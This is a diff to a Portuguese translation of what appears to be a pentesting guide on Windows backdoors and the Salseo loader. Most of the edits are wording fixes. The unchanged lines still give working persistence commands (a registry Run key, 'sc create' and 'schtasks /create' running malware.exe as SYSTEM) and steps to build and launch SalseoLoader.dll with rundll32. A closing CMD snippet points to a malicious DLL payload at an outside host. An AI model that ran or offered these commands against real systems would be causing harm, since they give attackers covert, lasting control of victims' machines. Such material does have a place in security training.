@@ -57,7 +57,7 @@ reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Malware" /t REG_S
 
 #### Porta dos Fundos do Serviço
 
-Os serviços do Windows são programas que são executados em segundo plano e fornecem funcionalidade para o sistema operacional e para os aplicativos instalados. Uma técnica comum de backdoor é criar um serviço que execute um programa malicioso sempre que o sistema é iniciado.
+Os serviços do Windows são programas que são executados em segundo plano e fornecem funcionalidades para o sistema operacional e para os aplicativos instalados. Uma técnica comum de backdoor é criar um serviço que execute um programa malicioso sempre que o sistema é iniciado.
 
 Para criar um serviço, use o comando `sc create` no prompt de comando. Por exemplo, o seguinte comando cria um serviço chamado `MalwareService` que executa um programa chamado `malware.exe` sempre que o sistema é iniciado:
 
@@ -67,9 +67,9 @@ sc create MalwareService binPath= "C:\malware.exe" start= auto DisplayName= "Mal
 
 #### Porta dos Fundos do Agendador de Tarefas
 
-O Agendador de Tarefas do Windows é uma ferramenta que permite agendar a execução de programas em horários específicos ou em resposta a eventos específicos. Uma técnica comum de backdoor é criar uma tarefa agendada que execute um programa malicioso sempre que o sistema é iniciado ou em horários específicos.
+O Agendador de Tarefas do Windows é uma ferramenta que permite agendar a execução de programas em horários específicos ou em eventos específicos, como o início do sistema ou o login de um usuário. Uma técnica comum de backdoor é criar uma tarefa agendada que execute um programa malicioso sempre que o sistema é iniciado ou quando um usuário faz login.
 
-Para criar uma tarefa agendada, use o comando `schtasks /create` no prompt de comando. Por exemplo, o seguinte comando cria uma tarefa agendada chamada `MalwareTask` que executa um programa chamado `malware.exe` sempre que o sistema é iniciado:
+Para criar uma tarefa agendada, use o comando `schtasks.exe` no prompt de comando. Por exemplo, o seguinte comando cria uma tarefa agendada chamada `MalwareTask` que executa um programa chamado `malware.exe` sempre que o sistema é iniciado:
 
 ```
 schtasks /create /tn "MalwareTask" /tr "C:\malware.exe" /sc onstart /ru SYSTEM
@@ -125,15 +125,15 @@ Abra o projeto SalseoLoader usando o Visual Studio.
 
 ### Adicione antes da função principal: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1).png>)
 
 ### Instale o DllExport para este projeto
 
 #### **Ferramentas** --> **Gerenciador de Pacotes NuGet** --> **Gerenciar Pacotes NuGet para a Solução...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1).png>)
 
-#### **Procure pelo pacote DllExport (usando a guia Procurar), e pressione Instalar (e aceite o popup)**
+#### **Procure pelo pacote DllExport (usando a guia Procurar) e pressione Instalar (e aceite o popup)**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1).png>)
 
@@ -151,7 +151,7 @@ Apenas **saia** do Visual Studio
 
 Em seguida, vá para a sua pasta **SalseoLoader** e **execute DllExport\_Configure.bat**
 
-Selecione **x64** (se você for usá-lo dentro de uma caixa x64, esse foi o meu caso), selecione **System.Runtime.InteropServices** (dentro de **Namespace para DllExport**) e pressione **Aplicar**
+Selecione **x64** (se você for usá-lo dentro de uma caixa x64, esse foi o meu caso), selecione **System.Runtime.InteropServices** (dentro do **Namespace para DllExport**) e pressione **Aplicar**
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1).png>)
 
@@ -198,7 +198,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD é um acrônimo para Command Prompt, que é uma ferramenta de linha de comando usada para executar comandos no sistema operacional Windows. É uma ferramenta poderosa para hackers, pois permite executar comandos rapidamente e sem a necessidade de uma interface gráfica. Além disso, muitas ferramentas de hacking são executadas por meio do CMD, tornando-o uma ferramenta essencial para qualquer hacker.
+CMD (Command Prompt) é uma ferramenta de linha de comando do Windows que permite aos usuários interagir com o sistema operacional por meio de comandos. É uma ferramenta poderosa para hackers, pois permite executar comandos rapidamente e sem a necessidade de uma interface gráfica. Além disso, muitas ferramentas de hacking são executadas por meio do CMD.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
